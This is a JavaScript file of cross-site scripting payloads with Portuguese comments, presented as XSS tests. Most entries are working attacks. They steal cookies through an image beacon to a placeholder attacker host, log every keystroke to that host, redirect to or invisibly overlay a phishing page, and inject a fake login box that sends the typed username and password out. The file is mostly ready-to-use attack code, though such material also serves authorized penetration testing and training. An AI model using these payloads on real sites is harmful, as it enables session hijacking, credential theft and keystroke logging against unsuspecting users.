// xss_tests.js — Diversos testes de XSS por Carlos Tuma

// 1. Alerta básico (funciona na maioria das injeções simples)
alert("XSS Test 1: alerta básico");

// 2. Coleta de cookies
console.log("XSS Test 2: Cookie capturado →", document.cookie);

// 3. Envio de cookie para servidor remoto (exfiltração)
(new Image()).src = "http://SEU-IP:8000/log?cookie=" + encodeURIComponent(document.cookie);

// 4. Redirecionamento (phishing ou controle de fluxo)
window.location = "http://SEU-IP/phishing.html";

// 5. DOM Injection: inserir HTML malicioso via innerHTML
document.body.innerHTML += '<div style="background:red;color:white;font-size:20px;padding:10px;">XSS Test 5: DOM modificado</div>';

// 6. Keylogger básico (envia cada tecla para servidor)
document.addEventListener('keydown', function(e) {
  fetch('http://SEU-IP:8000/keys?key=' + encodeURIComponent(e.key));
});

// 7. Criação de iframe invisível para clickjacking ou phishing
let iframe = document.createElement('iframe');
iframe.src = "http://SEU-IP/phishing.html";
iframe.style = "position:absolute;top:0;left:0;width:100vw;height:100vh;opacity:0;z-index:9999;";
document.body.appendChild(iframe);

// 8. Pop-up de login falso (engenharia social)
let div = document.createElement('div');
div.innerHTML = `
  <div style="position:fixed;top:30%;left:30%;width:300px;height:200px;background:white;box-shadow:0 0 10px black;padding:20px;z-index:10000">
    <h3>Login necessário</h3>
    <input id="fake-user" placeholder="Usuário" /><br><br>
    <input id="fake-pass" placeholder="Senha" type="password"/><br><br>
    <button onclick="fetch('http://SEU-IP:8000/creds?u=' + document.getElementById('fake-user').value + '&p=' + document.getElementById('fake-pass').value)">Entrar</button>
  </div>`;
document.body.appendChild(div);
